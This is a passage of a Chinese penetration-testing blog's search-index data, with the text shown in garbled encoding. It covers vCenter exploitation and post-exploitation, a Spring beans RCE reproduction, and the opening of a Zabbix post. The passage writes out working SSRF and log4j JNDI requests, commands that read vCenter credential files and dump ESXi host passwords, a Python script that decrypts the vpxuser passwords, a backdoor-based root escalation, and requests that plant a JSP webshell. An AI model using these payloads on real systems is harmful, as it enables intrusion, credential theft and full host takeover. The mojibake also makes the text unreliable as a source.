æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.6 provider-logo SSRF æ¼æ´ 2.6.1 æ¼æ´åˆ©ç”¨ VMware vCenter v 7.0.x çš„æŸäº›ç‰ˆæœ¬ä¸­å­˜åœ¨æœªæˆæƒ SSRF æ¼æ´ï¼Œå¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶é€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼›è¯»å–è¿œç¨‹æ–‡ä»¶å½¢æˆ XSS æ¼æ´ã€‚ POC \u0026 EXPï¼š /nuclei-templates/vulnerabilities/vmware/vmware-vcenter-ssrf.yaml GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/1.1 Host: {{target}} è¯»å– /etc/passwdï¼š è¯»å– postgresql é…ç½®æ–‡ä»¶ï¼š 2.6.2 æ¼æ´åˆ†æ æ¼æ´ url ä¸º /ui/vcav-bootstrap/rest/vcav-providers/provider-logoï¼Œé€šè¿‡ 500 é”™è¯¯è·å–ä»£ç è°ƒç”¨æ ˆï¼Œæœ€ååœ¨ ProvidersController.getProviderLogo æ‰§è¡Œæ—¶å‡ºé”™ã€‚å®šä½åˆ°ç›¸å…³ jar åŒ…ï¼š/etc/vmware/vsphere-ui/cm-service-packages/com.vmware.cis.vsphereclient.plugin/com.vmware.h4.vsphere.client-0.4.1.0/plugins/h5-vcav-bootstrap-service.jarã€‚ com.vmware.h4.vsphere.ui.bootstrap.controller.ProvidersController.getProviderLogo() å‡½æ•°ä»£ç æ¯”è¾ƒç®€å•ï¼Œé€šè¿‡ URLConnection è¯»å– URL å¹¶è§£æã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:6","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.7 log4j2 JNDI æ³¨å…¥ VMware çš„äº§å“åŒæ ·ä¹Ÿå— log4j2 æ¼æ´çš„å½±å“ï¼Œå…·ä½“å¯ä»¥å‚è€ƒï¼šVMSA-2021-0028ã€‚ POCï¼š /nuclei-templates/vulnerabilities/vmware/vmware-vcenter-log4j-jndi-rce.yaml GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1 Host: {{Hostname}} X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}} å…·ä½“æ¼æ´æˆå› åœ¨æ­¤å°±ä¸å†èµ˜è¿°ã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:7","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 åæ¸—é€æµ‹è¯• ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:0","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 SAML è¯ä¹¦ç™»å½• vSphere 5.0 ç‰ˆæœ¬å¼•å…¥äº† SSOï¼Œæ”¯æŒä½¿ç”¨ SAML ä½œä¸ºæˆæƒæœåŠ¡æ”¯æŒã€‚å½“ç”¨æˆ·ç™»å½•æœåŠ¡æ—¶ï¼Œè¯¥æœåŠ¡ä¼šå°†èº«ä»½éªŒè¯è¯·æ±‚è½¬å‘ç»™ SAML ã€‚SAML éªŒè¯ç”¨æˆ·å‡­æ®æ˜¯å¦æ­£ç¡®ä»¥åŠä»–ä»¬æ˜¯å¦æœ‰æƒè®¿é—®æŒ‡å®šçš„æœåŠ¡ã€‚ åœ¨ vCenter ä¸­ä» /storage/db/vmware-vmdir/data.mdb æå– IdP è¯ä¹¦ï¼Œä¸ºç®¡ç†å‘˜ç”¨æˆ·åˆ›å»º SAML è¯·æ±‚ï¼Œæœ€åä½¿ç”¨ vCenter server è¿›è¡Œèº«ä»½éªŒè¯å¹¶è·å¾—æœ‰æ•ˆçš„ç®¡ç†å‘˜ cookieã€‚ é¦–å…ˆéœ€è¦ä» vCenter è·å¾—æ•°æ®åº“æ–‡ä»¶ï¼š Linuxï¼š/storage/db/vmware-vmdir/data.mdb Windowsï¼šC:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb åˆ©ç”¨ SAML è§£å¯†è„šæœ¬ç”Ÿæˆ Cookieï¼š python3 vcenter_saml_login.py -p data.mdb -t 192.168.0.92 ç™»å½• VCSA ç®¡ç†é¢æ¿ï¼Œè®¿é—® https://IP/uiï¼Œå¹¶è®¾ç½® Cookie ä¸ºä¸Šé¢çš„è¿”å›ç»“æœã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:1","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.2 CVE-2022-22948 æƒé™é…ç½®ä¸å½“ vCenter Server åŒ…å«ç”±äºæ–‡ä»¶æƒé™ä¸æ­£ç¡®è€Œå¯¼è‡´çš„ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨å¯¹ vCenter Server å…·æœ‰éç®¡ç†å‘˜è®¿é—®æƒé™çš„æƒ…å†µä¸‹è·å–æ•æ„Ÿä¿¡æ¯ã€‚ é€šè¿‡ç¬¬äºŒèŠ‚æè¿°çš„æ¼æ´è·å–çš„ webshell æƒé™é€šå¸¸ä¸ºï¼švphere-uiï¼Œå½’å±äºç”¨æˆ·ç»„ï¼šcisã€‚åœ¨ vCenter ç³»ç»Ÿçš„ç ”ç©¶ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªåŒ…å«å®¢æˆ·ç«¯ postgresDB çš„æ˜æ–‡ç™»å½•å‡­è¯çš„æ–‡ä»¶ï¼š/etc/vmware-vpx/vcdb.propertiesã€‚ä»»ä½•å±äº cis ç»„çš„ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚å³ï¼šä»»ä½•å±äº cis ç»„çš„ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥åˆ° vCenter çš„ Postgres æ•°æ®åº“ã€‚ è·å– postgresql é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼š # linux cat /etc/vmware-vpx/vcdb.properties # or cat /etc/vmware/service-state/vpxd/vcdb.properties # windows type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vps\\vcdb.properties è¿æ¥æ•°æ®åº“ï¼Œè¯»å– vpxuser å¯†é’¥ï¼š # linux /opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" \u003e password.enc #windows C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" \u003e password.enc è·å– symkey.datï¼š # linux cat /etc/vmware-vpx/ssl/symkey.dat # windows type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat è§£å¯† vpxuser å¯†ç  python3 decrypt.py symkey.dat password.enc password.txt è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š import base64 import sys from Crypto.Cipher import AES usage = \"\"\" Where is symkey.dat Windowsï¼šC:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat Linuxï¼š/etc/vmware-vpx/ssl/symkey.dat Where is psql Windows: C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe Linux: /opt/vmware/vpostgres/current/bin/psql psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" \u003e password.enc python3 decrypt.py symkey.dat password.enc password.txt \"\"\" def pkcs7unpadding(text): length = len(text) padding_length = ord(text[-1]) return text[0:length-padding_length] def decrypt(key, enc_passwords): passwords = [] key_bytes = bytes.fromhex(key) for enc_password in enc_passwords: content = base64.b64decode(enc_password) iv_bytes = content[:16] enc_password_bytes = content[16:] cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes) password_bytes = cipher.decrypt(enc_password_bytes) password = str(password_bytes, encoding='utf-8') password = pkcs7unpadding(password) passwords.append(password) return passwords def save_decrypt_password(path, passwords): data = '\\n'.join(passwords) with open(path, 'w') as file: file.write(data) def get_encrypt_password(path): encrypt_passwords = [] with open(path) as file: for line in file: encrypt_password = line.strip('*').strip() encrypt_passwords.append(encrypt_password) return encrypt_passwords def get_key(path): with open(path) as file: key = file.read().strip() return key def main(): if len(sys.argv) != 4: print(usage) exit(1) key = get_key(sys.argv[1]) encrypt_passwords = get_encrypt_password(sys.argv[2]) save_path = sys.argv[3] passwords = decrypt(key, encrypt_passwords) save_decrypt_password(save_path, passwords) if __name__ == '__main__': main() ä¸Šè¿°è·å–åˆ°çš„ vpxuser æ˜¯åœ¨ ESXi ä¸ vCenter çš„ç¬¬ä¸€æ¬¡è¿æ¥ä¸­è‡ªåŠ¨åˆ›å»ºçš„é«˜æƒé™ç”¨æˆ·ã€‚ vpxuser ç”¨æˆ·æ˜¯é»˜è®¤åœ¨ ESXi ä¸Šåˆ›å»ºçš„ï¼Œå®ƒæ˜¯æ ¹æ®æœ€å°æƒé™åŸåˆ™è®¾è®¡çš„ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç”± vCenter ç®¡ç†è€Œä¸ä½¿ç”¨ rootã€‚è¯¥ç”¨æˆ·æ˜¯é€šè¿‡ä¸€ä¸ªåä¸º vpxd çš„è¿›ç¨‹åˆ›å»ºçš„ï¼Œå®ƒè´Ÿè´£ ESXi å’Œ vCenter ä¹‹é—´çš„é€šä¿¡ã€‚ å…³äºè¿™ä¸ªç”¨æˆ·çš„ä¿¡æ¯å¹¶ä¸å¤šï¼Œåœ¨ ESXi ä¸Šçš„ passwd æ–‡ä»¶ä¸­å‘ç°äº†ä¸€ä¸ªå…³äºå®ƒçš„æ³¨é‡Š - VMware VirtualCenter administrator accountã€‚ æœ€åï¼Œä½¿ç”¨ vpxuser å‡­è¯é€šè¿‡ SSH è¿æ¥åˆ°å…·æœ‰é«˜æƒé™çš„è¢«ç®¡ç†çš„ ESXiï¼Œå¹¶å¯ä»¥å¯¹ ESXi å®Œå…¨æ§åˆ¶ï¼šæå–è™šæ‹Ÿæœºçš„å†…å­˜ã€åˆ—å‡ºåº“å­˜ã€è·å–æ•æ„Ÿæ–‡ä»¶ã€è®¿é—®æ•æ„Ÿä¿¡æ¯ç­‰ã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:2","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.3 CVE-2021-22015 - vCenter ææƒæ¼æ´ åˆ†æ vCenter ä¸­ä»¥ root æƒé™è¿è¡Œçš„è¿›ç¨‹ï¼Œå‘ç°å¦‚ä¸‹åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹è¿è¡Œçš„ java è¿›ç¨‹å‡é“¾æ¥åˆ°åŒä¸€ä¸ªæ–‡ä»¶ï¼š æŸ¥çœ‹ /usr/lib/vmware-vmon/java-wrapper-vmon ä¿®æ”¹æƒé™ï¼š cis ç”¨æˆ·ç»„å¯ä»¥ä¿®æ”¹è¯¥æ–‡ä»¶ã€‚åœ¨ /etc/group ä¸‹æŸ¥çœ‹ cis ç”¨æˆ·ç»„ä¸­çš„ç›¸å…³ç”¨æˆ·ï¼š å‘ç° vsphere-ui ç”¨æˆ·åœ¨å…¶ä¸­ï¼Œè¯´æ˜è¯¥ç”¨æˆ·å¯ä»¥ä¿®æ”¹ java-wrapper-vmon æ–‡ä»¶ã€‚é…åˆç¬¬äºŒèŠ‚çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œåœ¨ vsphere-ui webshell çš„æƒé™ä¸‹ï¼Œå°†åé—¨ä»£ç æ·»åŠ åˆ° java-wrapper-vmon ä¸­ï¼Œå¹¶é‡å¯æœåŠ¡(service-control --start --all)ï¼Œå¯ä»¥ä»¥ root æƒé™è¿è¡Œåé—¨ä»£ç ï¼Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:3","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.4 ææƒ 3.4.1 CVE-2021-3156 - sudo ææƒ é€‚ç”¨ç‰ˆæœ¬ï¼švCenter 7.0ã€‚sudo ææƒæ¼æ´å°† vsphere-ui æƒé™æå‡åˆ° root æƒé™ã€‚ vCenter é•œåƒæ˜¯åŸºäº Photon OS æ„å»ºçš„ã€‚è€Œæ—§ç‰ˆæœ¬çš„ vCenter ä½¿ç”¨çš„æ˜¯ Photon 1.0ï¼Œåœ¨ vCenter 7 ä¸­ä½¿ç”¨çš„åˆ™æ˜¯ Photon 3.0ã€‚ vCenter 7 çš„ glibc åº“ç‰ˆæœ¬ä¸º 2.28ï¼Œsudo ç‰ˆæœ¬ä» 1.8.x åˆ° 1.9.x å‡å­˜åœ¨ã€‚ æ ¹æ® @Cedric Halbronn çš„ç ”ç©¶ï¼Œåœ¨ Photon OS 3.0 ä¸Šçš„ cmnd size ä¸ defaults offset å‡ä¸ CentOS 7 ä¸Šçš„æ•°å€¼ä¸ä¸€æ ·ï¼Œé€šè¿‡ä¿®æ”¹ä¸Šé¢çš„å—å¤§å°ä¸åç§»é‡ï¼Œå¯ä»¥å®ç°åœ¨ vCenter7 ä¸Šçš„ sudo ææƒï¼Œå…·ä½“çš„ EXPï¼šexploit_defaults_mailer.py å‚è€ƒï¼š VMware vCenter RCE æ¼æ´è¸©å‘å®å½• VMware vCenter æ¼æ´åˆ†æï¼ˆä¸€ï¼‰ Vcenter æ¼æ´åˆ†æ CVE-2021-21985 vCenter Server è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ vCenter 2021 å‡ ä¸ªæ¼æ´åŠåæ¸—é€ å…¨ç½‘æœ€è¯¦ç»†çš„ ESXI è¿›é˜¶æ•™ç¨‹ CVE-2021-21972 vCenter Server æ–‡ä»¶å†™å…¥æ¼æ´åˆ†æ CVE-2021-21972 å¤ç°å’Œåˆ†æ CVE-2021-22005-CEIPåˆ†æ VMware CVE-2021-22005 Technical \u0026 Impact analysis vSphereå¼€å‘æŒ‡å—6â€”â€”vCenter SAML Certificates CVE-2022-22948: Sensitive Information Disclosure in VMware vCenter CVE-2021-3156 ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:4","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"Spring beans RCE æ¼æ´åˆ†æ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"Spring beans RCE æ¼æ´åˆ†æ ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 å½±å“èŒƒå›´ JDK 9 åŠå…¶ä»¥ä¸Šç‰ˆæœ¬ Spring æ¡†æ¶ä»¥åŠè¡ç”Ÿçš„æ¡†æ¶ spring-beans-*.jar æ–‡ä»¶æˆ–è€…å­˜åœ¨ CachedIntrospectionResults.class ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:0","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 æ¼æ´å¤ç° ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:0","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.1 ç¯å¢ƒæ­å»º æœ¬æ–‡ä½¿ç”¨çš„æ˜¯ spring-core-rce-2022-03-29 docker é•œåƒï¼Œå¯åŠ¨é•œåƒï¼š docker run --name springRCE -p 8090:8080 -d vulfocus/spring-core-rce-2022-03-29 ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:1","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.2 æ¼æ´åŸç† é€šè¿‡ç›´æ¥ä¿®æ”¹ tomcat çš„ log æ—¥å¿—é…ç½®ï¼Œå³å¯ä»¥å‘ webapp/ROOT ä¸‹å†™ jsp æ–‡ä»¶ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ï¼Œä¸ s2-020 çš„åˆ©ç”¨æ–¹å¼ç›¸ä¼¼ã€‚ é¦–å…ˆå‘ç›®æ ‡å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼š # è®¾ç½®æ–‡ä»¶åç¼€ä¸º .jsp class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp # è®¾ç½®æ–‡ä»¶å‰ç¼€ä¸º shell class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell # è®¾ç½®æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ä¸º webapp/pathï¼Œåªæœ‰è¯¥æ–‡ä»¶ä¸‹çš„ jsp æ–‡ä»¶ä¼šè¢«è§£æï¼Œæœ¬æ–‡ä»¥ ROOT ä¸ºä¾‹ class.module.classLoader.resources.context.parent.pipeline.first.directory=webapp/ROOT å…¶æ¬¡ï¼Œå†è®¾ç½® log çš„ pattern å’Œ fileDateFormatï¼Œè¿™é‡Œçš„ pattern æ˜¯æœ‰ä¸€å®šæ ¼å¼é™åˆ¶çš„ï¼Œæ ¹æ® tomcat å®˜æ–¹å¯¹äº Access Logging çš„å®šä¹‰ï¼Œè¯¥é¡¹å€¼å¯ä»¥ä¸ºï¼š common ä¸ combinedï¼Œå…¶ä¸­ common çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š %a - Remote IP address. See also %{xxx}a below. %A - Local IP address %b - Bytes sent, excluding HTTP headers, or '-' if zero %B - Bytes sent, excluding HTTP headers %h - Remote host name (or IP address if enableLookups for the connector is false) %H - Request protocol %l - Remote logical username from identd (always returns '-') %m - Request method (GET, POST, etc.) %p - Local port on which this request was received. See also %{xxx}p below. %q - Query string (prepended with a '?' if it exists) %r - First line of the request (method and request URI) %s - HTTP status code of the response %S - User session ID %t - Date and time, in Common Log Format %u - Remote user that was authenticated (if any), else '-' (escaped if required) %U - Requested URL path %v - Local server name %D - Time taken to process the request in millis. Note: In httpd %D is microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards. %T - Time taken to process the request, in seconds. Note: This value has millisecond resolution whereas in httpd it has second resolution. Behaviour will be align to httpd in Tomcat 10 onwards. %F - Time taken to commit the response, in milliseconds %I - Current request thread name (can compare later with stacktraces) combined çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š %{xxx}a write remote address (client) (xxx==remote) or connection peer address (xxx=peer) %{xxx}i write value of incoming header with name xxx (escaped if required) %{xxx}o write value of outgoing header with name xxx (escaped if required) %{xxx}c write value of cookie with name xxx (escaped if required) %{xxx}r write value of ServletRequest attribute with name xxx (escaped if required) %{xxx}s write value of HttpSession attribute with name xxx (escaped if required) %{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote) %{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx æœ¬æ–‡çš„å†™ webshell çš„æ–¹æ¡ˆå³æ˜¯é€‰æ‹© combined ç›¸å…³æ ¼å¼å­—ç¬¦ã€‚ ç”±äºå†™å…¥ä¸€å¥è¯ webshell æ—¶ï¼Œéœ€è¦ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ï¼š%ï¼Œè€Œ % åœ¨æ—¥å¿—çš„é…ç½®ä¸­åˆå…·æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œç›´æ¥åœ¨ pattern ä¸­å†™å…¥ä¼šæŠ¥é”™ æ€»ä¹‹ï¼Œéœ€è¦é¿å¼€ç›´æ¥å¯¹äºç™¾åˆ†å·çš„å†™å…¥ï¼Œä¸‹æ–‡å°è¯•äº†æœ‰ä¸‰ç§æ–¹å¼å»å®šä¹‰ patternã€‚ 2.2.1 ä» header ä¸­è¯»å– ç”±ä¸Šæ–‡å¯çŸ¥ï¼Œ%{xxx}c é¡¹çš„ä½œç”¨æ˜¯ï¼šä» HTTP Cookie ä¸­è¯»å– xxx é¡¹ï¼Œå¹¶å†™å…¥åˆ° log æ–‡ä»¶ä¸­ã€‚å› æ­¤æ•°æ®åŒ…å®šä¹‰ä¸ºï¼š class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Dc æœ€åçš„ HTTP è¯·æ±‚ä¸ºï¼š GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Dc HTTP/1.1 Host: IP:PORT Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: remember-me=YWRtaW46MTY0OTIxMzE4ODQyMTpmYzJiZTA2NWMyYzFlOGQwOTUzMWJkOGQxZmMzYmQ1Yg; cmd=\u003c%out.println(11223344);%\u003e Connection: close ç”±äº ; ä½œä¸º Cookie çš„åˆ†éš”ç¬¦ï¼Œå› æ­¤å†™å…¥çš„å†…å®¹ä¼šè¢«æˆªæ–­ã€‚ï¼ˆä¸çŸ¥å“ªä½å¸ˆå‚…æœ‰è§£å†³åŠæ³•ï¼Œå¯ä»¥åˆ†äº«ä¸‹ï¼‰ï¼š\u003c%out.println(11223344) 2.2.2 ä» header ä¸­è¯»å– ç”±ä¸Šæ–‡å¯çŸ¥ï¼Œ%{xxx}i é¡¹çš„ä½œç”¨æ˜¯ï¼šä» HTTP Header ä¸­è¯»å– xxx é¡¹ï¼Œå¹¶å†™å…¥åˆ° log æ–‡ä»¶ä¸­ã€‚å› æ­¤æ•°æ®åŒ…å®šä¹‰ä¸ºï¼š class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=2 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di æœ€åçš„ HTTP è¯·æ±‚ä¸ºï¼š GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di HTTP/1.1 Host: IP:PORT cmd: \u003c%out.println(\"11223344\");%\u003e Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applicatio","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:2","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"3 ä¸´æ—¶ä¿®å¤æ–¹æ¡ˆ WAF ä¸­å¯¹å‚æ•°ä¸­å‡ºç°çš„ class.*ï¼Œ Class.*ï¼Œ*.class.*ï¼Œ *.Class.* å­—ç¬¦ä¸²çš„è§„åˆ™è¿‡æ»¤ å…¨å±€æœç´¢ @InitBinder æ³¨è§£ï¼Œåˆ¤æ–­æ–¹æ³•ä½“å†…æ˜¯å¦æœ‰ dataBinder.setDisallowedFields æ–¹æ³•ï¼Œ å¦‚æœæœ‰ä½¿ç”¨åˆ™åœ¨åŸæ¥çš„é»‘åå•ä¸­æ·»åŠ ï¼š ","date":"2022-03-30","objectID":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:0","tags":["æ¼æ´å¤ç°"],"title":"Spring beans RCE æ¼æ´åˆ†æ","uri":"/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:0:0","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 å‰è¨€ Zabbix æ˜¯ä¸€ä¸ªåŸºäº WEB ç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆï¼Œèƒ½ç›‘è§†å„ç§ç½‘ç»œå‚æ•°ï¼Œä¿è¯æœåŠ¡å™¨ç³»ç»ŸæœåŠ¡å™¨ç³»ç»Ÿçš„å®‰å…¨è¿è¥ï¼›å¹¶æä¾›çµæ´»çš„é€šçŸ¥æœºåˆ¶ä»¥è®©ç³»ç»Ÿç®¡ç†å‘˜å¿«é€Ÿå®šä½ã€è§£å†³å­˜åœ¨çš„å„ç§é—®é¢˜ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:1:0","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.1 ç»„ä»¶ Zabbix ç›‘æ§ç³»ç»Ÿç”±ä»¥ä¸‹å‡ ä¸ªç»„ä»¶éƒ¨åˆ†æ„æˆï¼š Zabbix Server Zabbix Server æ˜¯æ‰€æœ‰é…ç½®ã€ç»Ÿè®¡å’Œæ“ä½œæ•°æ®çš„ä¸­å¤®å­˜å‚¨ä¸­å¿ƒï¼Œä¹Ÿæ˜¯ Zabbix 